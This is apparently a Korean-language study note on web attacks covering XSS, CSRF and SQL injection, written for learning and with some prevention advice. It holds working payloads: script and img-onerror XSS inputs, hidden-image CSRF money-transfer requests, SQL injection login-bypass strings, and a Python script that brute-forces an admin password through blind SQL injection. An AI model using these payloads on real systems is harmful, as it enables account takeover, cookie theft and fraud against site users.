---
title: "Exploit"
date: 2025-03-11T20:54:59+09:00
lastmod: 2025-03-11T20:54:59+09:00
tags: []
categories: []
imgs:  []
cover:  ""  # image show on top
readingTime:  true  # show reading time after article date
toc:  true
comments:  false
justify:  false  # text-align: justify;
single:  false  # display as a single page, hide navigation on bottom, like as about page.
license:  "BY-SA"  # CC License, https://creativecommons.org/licenses/?lang=ko
draft: false
---

# XSS (Cross Site Scripting)
- 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 공격이다.
- XSS 취약점이 존재하는 사이트에 공격자는 origin 권한으로 악성 스크립트가 포함된 페이지를 만들어서 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자의 악성 스크립트가 동작해 정보를 탈취하는 방식이다.

## 공격 경로
- XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다.
  - 악성 태그를 필터링하는 HTML Sanitization을 사용하거나 엔티티 코드로 치환하는 방법으로 XSS를 예방할 수 있다.
  - Flask는 `render_template` 함수를 사용하여 인자를 HTML 엔티티코드로 변환하여 출력하는 방식으로 XSS를 방지한다. 
- 아래와 같이 입력값을 그대로 출력하게 되면, 입력값으로 script 를 전달해 공격에 사용할 수 있다.
  - 서버의 코드
    ``` 
    @app.route("/vulnerable")
    def vulnerable():
        param = request.args.get("param", "") # 이용자가 입력한 인자를 가져옴
        return param # 이용자의 입력값을 화면 상에 표시
    ```
  - 공격자 입력1. 다른 페이지로 redirection
    ```
    <script>location.href = "/another_page?param=PARAM1";</script>
    ```
  - 공격자 입력2. cookie 정보 출력
    ```
    <script>document.cookie</script>
    ```
## XSS 공격 종류
- XSS 는 악성 스크립트의 위치와 침투 경로에 따라 아래와 같이 구분된다. 
  - Stored XSS : XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS
    - 게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식이 있음
    - 불특정 다수에게 보여지기 때문에 파급력이 크다.
  - Reflected XSS : XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS
    - 게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식이 있음
    - 검색 결과를 응답에 포함하는 일부 서비스에서 발생 가능
    -  공격을 위해서는 다른 이용자를 악성 스크립트가 포함된 링크에 접속하도록 유도해야 함
  - DOM-based XSS : XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS
  - Universal XSS : 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS

# CSRF (Cross Site Request Forgery)
- 어떤 사이트에서 이용자의 신원 정보가 포함된 쿠키를 사용한다면, 타인의 쿠키를 탈취하여 변조된 명령을 서버로 번달하는 공격 방식이다. 
  - 이용자의 신원 정보가 포함된 쿠키는 일종의 서명과 같은 역할을 하기 때문에, 쿠키가 특정 명령에 대한 이용자의 본인 인증 역할을 수행할 수도 있다.
- 2차 인증을 수행하지 않고 cookie로만 인증을 하는 사이트에 대해 공격이 가능하다. 
- `XSS`는 인증 정보인 세션 및 쿠키 탈취를 목적으로 서버에서 스크립트를 실행 하는 방식인 반면, `CSRF`는 이용자가 임의 페이지에 HTTP 요청을 보내는 것을 목적으로 하는 공격이다.

## 공격 경로
- `<img>` 태그나 `<form>` 태그를 활용해서 사용자가 의도하지 않은 명령을 서버에 요청하는 script를 실행시킬 수 있다. 
    ```
    /* img 태그 활용 요청 전달 */
    <img src='http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337' width=0px height=0px>`
    ```
    ```
    /* javascript 공격 예시 */
    /* 새 창 띄우기 */
    window.open('http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337');
    /* 현재 창 주소 옮기기 */
    location.href = 'http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337';
    location.replace('http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337');
    ```

## SQL Injection
- 조작된 SQL 쿼리를 서버에 주입하여 인증을 우회하거나, 데이터베이스의 정보를 유출하는 공격행위
- Blind SQL Injection : SQL Injection 의 한 종류로, DBMS가 답변 가능한 형태로 질문을 수행하여 스무고개 게임과 같이 정답을 유추해 나가는 공격 기법

# 공격 기법
1. innerHTML 을 통한 XSS 취약점 공격
  - 조건: 사용자의 입력을 출력하는 형태를 지닌 시스템
  - 방법: `<script>` 태그와 공격용 javascript 를 url 파라미터 혹은 request 에 포함시켜 공격용 javascript 가 실행되게 한다.
  - 예시)
    - 서버의 코드
       ``` 
       @app.route("/vulnerable")
       def vulnerable():
           param = request.args.get("param", "") # 이용자가 입력한 인자를 가져옴
           return param # 이용자의 입력값을 화면 상에 표시
       ```
    - 공격자 입력1. 다른 페이지로 redirection
       ```
       <script>location.href = "/another_page?param=PARAM1";</script>
       ```
    - 공격자 입력2. cookie 정보 출력
       ```
       <script>document.cookie</script>
       ```
2. innerHTML 을 통한 XSS 취약점 공격2
   - \<script> 태그 없이 javascript를 실행시키는 방법
   - 조건 : 서버에 기본적인 XSS 방지 기법이 적용되어 \<script> 태그를 주입시킬 수 없는 경우 (ex: render_template 를 사용한 경우)
   - 방법 : `<image>` 태그의 `onerror` 필드에 script를 주입한다.
   - [참조](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)
   - 예시)
     - 동작하지 않는 script(XSS공격 실패)
       ```
       name = "<script>alert('I am John in an annoying alert!')</script>";
       el.innerHTML = name; // harmless in this case
       ```
     - 동작하는 script (XSS공격 성공)
       ```
       const name = "<img src='x' onerror='alert(1)'>";
       el.innerHTML = name; // shows the alert
       # x라는 경로에 이미지가 없어서 onerror 로 설정된 javascript가 실행된다.
       ```


3. SQL Injection
- 아래 쿼리를 SQL Injection으로 공격하고자 한다면
  ```
  SELECT * FROM users WHERE userid="{userid}" AND userpassword="{userpassword}";
  ``` 
- userid 변수와 userpassword 에 아래와 같은 값이 들어가게 입력을 조작하면 'admin' 계정을 탈취할 수 있다.
  ```
  /*
  ID: admin"--, PW: DUMMY
  userid 검색 조건만을 처리하도록, 뒤의 내용은 주석처리하는 방식
  */
  SELECT * FROM users WHERE userid="admin"-- " AND userpassword="DUMMY"

  /*
  ID: admin" or "1 , PW: DUMMY
  userid 검색 조건 뒤에 OR (또는) 조건을 추가하여 뒷 내용이 무엇이든, admin 이 반환되도록 하는 방식
  */
  SELECT * FROM users WHERE userid="admin" or "1" AND userpassword="DUMMY"

  /*
  ID: admin, PW: DUMMY" or userid="admin
  userid 검색 조건에 admin을 입력하고, userpassword 조건에 임의 값을 입력한 뒤 or 조건을 추가하여 userid가 admin인 것을 반환하도록 하는 방식
  */
  SELECT * FROM users WHERE userid="admin" AND userpassword="DUMMY" or userid="admin"

  /*
  ID: " or 1 LIMIT 1,1-- , PW: DUMMY
  userid 검색 조건 뒤에 or 1을 추가하여, 테이블의 모든 내용을 반환토록 하고 LIMIT 절을 이용해 두 번째 Row인 admin을 반환토록 하는 방식
  */
  SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword="DUMMY"
  ```
1. Blind SQL Injection
- 글자 위치 추론
  ```
  # 첫 번째 글자 구하기
  SELECT * FROM user_table WHERE uid='admin' and substr(upw,1,1)='a'-- ' and upw=''; # False
  SELECT * FROM user_table WHERE uid='admin' and substr(upw,1,1)='b'-- ' and upw=''; # True
  # 두 번째 글자 구하기
  SELECT * FROM user_table WHERE uid='admin' and substr(upw,2,1)='d'-- ' and upw=''; # False
  SELECT * FROM user_table WHERE uid='admin' and substr(upw,2,1)='e'-- ' and upw=''; # True 
  ```
- python 자동화
  ```
  #!/usr/bin/python3
  import requests
  import string
  # example URL
  url = 'http://example.com/login'
  params = {
      'uid': '',
      'upw': ''
  }
  # ascii printables
  tc = string.printable
  # 사용할 SQL Injection 쿼리
  query = '''admin' and substr(upw,{idx},1)='{val}'-- '''
  password = ''
  # 비밀번호 길이는 20자 이하라 가정
  for idx in range(0, 20):
      for ch in tc:
          # query를 이용하여 Blind SQL Injection 시도
          params['uid'] = query.format(idx=idx+1, val=ch).strip("\n")
          c = requests.get(url, params=params)
          print(c.request.url)
          # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
          if c.text.find("Login success") != -1:
              password += ch
              break
  print(f"Password is {password}")
  ```
